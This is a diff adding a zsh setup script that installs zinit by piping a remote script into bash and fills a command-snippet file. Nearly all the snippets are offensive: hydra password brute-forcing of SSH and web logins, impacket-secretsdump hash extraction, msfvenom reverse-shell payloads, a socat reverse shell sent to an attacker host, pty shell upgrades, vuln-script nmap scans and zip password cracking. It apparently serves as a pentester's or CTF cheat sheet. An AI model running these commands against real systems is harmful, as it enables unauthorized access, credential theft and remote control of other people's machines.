@@ -1,0 +1,76 @@
+#!/bin/zsh
+
+# ref: https://github.com/zdharma-continuum/zinit
+bash -c "$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/zdharma-continuum/zinit/HEAD/scripts/install.sh)"
+
+<< EOF >> $HOME/.zshrc
+
+zinit load joshskidmore/zsh-fzf-history-search
+zinit load Aloxaf/fzf-tab
+zinit load liangguohuan/fzf-marker
+
+# Load powerlevel10k theme
+# zinit ice depth"1" # git clone depth
+# zinit light romkatv/powerlevel10k
+
+EOF
+
+mkdir -p $HOME/.config/marker/
+<<-'EOF' >> $HOME/.config/marker/markers.txt
+feroxbuster -q -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -kn --url=  # no-recurse 
+feroxbuster -q -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -kn -x php -s 200 --url=$(urls -v)  # no-recurse-php
+feroxbuster -q -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -kn -x txt -s 200 --url=$(urls -v)  # no-recurse-text
+gospider --site=http://$ipv4 --depth 1 | sort -u | less
+hydra -o https-hydra -V -l admin -P rockyou.txt $ipv4 https-post-form "/ROUTE/index.php:username=^USER^&password=^PASS^&login=Log+In:F=Incorrect password.:H=Cookie:PHPSESSID=gusbflg7m2822159mlni2cr6f6"
+hydra -o ssh-hydra -V -l admin -P rockyou.txt $ipv4 ssh
+impacket-secretsdump -ntds {{ntds.dit}} -system {{SYSTEM.bin}} LOCAL  # awk -F: '{print $4}' hases
+impacket-smbserver SHARE $(pwd) 
+mount {{ipv4}}:/{{volume}} /mnt/{{volume}}/ # mount-nfs
+msfvenom -l encoders  # -e <encoder> 
+msfvenom -l formats   # -f <format> 
+msfvenom -l payload   # -p <payload>
+msfvenom -l platform  # --platform <platform> 
+msfvenom -p cmd/unix/python/shell_reverse_tcp LPORT=443 LHOST= 
+msfvenom -p cmd/unix/reverse LPORT=443 LHOST= 
+msfvenom -p cmd/unix/reverse_bash LPORT=443 LHOST= 
+msfvenom -p cmd/unix/reverse_netcat LPORT=443 LHOST= 
+msfvenom -p cmd/unix/reverse_nodejs LPORT=443 LHOST= 
+msfvenom -p cmd/unix/reverse_openssl LPORT=443 LHOST= 
+msfvenom -p cmd/unix/reverse_python LPORT=443 LHOST= 
+msfvenom -p cmd/unix/reverse_ssh LPORT=443 LHOST= 
+msfvenom -p cmd/windows/powershell_reverse_tcp LPORT=443 LHOST= 
+msfvenom -p cmd/windows/reverse_powershell LPORT=443 LHOST= 
+nmap --top-ports 20 -sU --open -Pn -n $ipv4  # quick-udp
+nmap -p "*netbios*","*microsoft*" --script-args="unsafe=1" --open --script vuln -v -Pn -n $ipv4  # smb-vuln
+nmap -p- -T5 -O -A --osscan-guess --version-all --max-retries 1 -v --open -Pn -n $ipv4 # quick-osscan
+nmap -p- -T5 -sS --max-retries 1 -v --open -Pn -n $ipv4  # full-syn
+nmap -sCV --version-all --script-args="unsafe=1" --script="not (brute or exploit or vuln or enum or broadcast or external or intrusive)" -v --open -Pn -n $ipv4 -p  # quick-snipe-scripts
+nmap -sCV --version-all --script-args="unsafe=1" -v --open -Pn -n $ipv4 -p # snipe-scripts
+nmap -sUV -T4 -F --version-intensity 0 -Pn -n  $ipv4  # fast-udp
+nmap -sV --max-retries 0 --version-intensity 0 --open -Pn -n $ipv4 -p  # snipe-version
+nmap -sV --script="banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods,ssh-publickey-acceptance" -v -p 22 -Pn -n $ipv4  # quick-ssh
+parallel nc -nvz $ipv4 ::: 20 21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1723 3306 3389 5900 8080 # quick-portscan 
+pip install pipenv && pipenv install --python 2.7 
+print "HEAD / HTTP/1.0\n\n" | nc $ipv4 80 # head-request 
+printf "EHLO all\n" | nc $ipv4 25 # smtp
+printf "VRFY %s\n" {{root}} | nc $ipv4 25 # smtp
+printf "stty rows %d columns %d" (($(tput lines) * 2)) $(tput cols)  # shell-upgrade
+python3 -c "__import__('pty').spawn('/bin/bash')" # pty
+python3 -c "__import__('subprocess').call(['/bin/bash'])" # pty
+python3 -c 'import pty; pty.spawn("/bin/sh")' # pty
+python3 -m http.server 80 -d /usr/share/scripts # http-server
+python3 -m pyftpdlib -p 21 -w # ftp-server
+python3 -m smtpd -n -c DebuggingServer localhost:25 # smtp-server (use impacket)
+rpcclient -U "" -N --option='client min protocol=NT1' $ipv4 # smb-enum, null-share
+setcap -r /bin/ping # remove-capabilities
+setcap cap_net_raw+p /bin/ping # add-capabilities
+smbclient //$ipv4/{{share}} # smb-list
+smbget -R smb://$ipv4/{{share}} # smb-copy
+socat TCP4-LISTEN:443 FILE:`tty`,raw,echo=0  # Linux Attacker :: Catch (Listener)
+socat TCP4:{{$LHOST}}:443 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane # Throw (Shell) :: Linux Target
+ssh -v {{user}}@{{host}} -o PreferredAuthentications=password
+tcpdump -i tun0 icmp and src $ipv4 # ping-listener
+wpscan --enumerate ap --plugins-detection aggressive --url http://$ipv4 
+zip2john {{file.zip}} > zip.john && john --wordlist={{wordlist}} zip.john  # crack-zipfile
+echo -n > $HOME/.config/marker/markers.txt # clear-markers 
+EOF
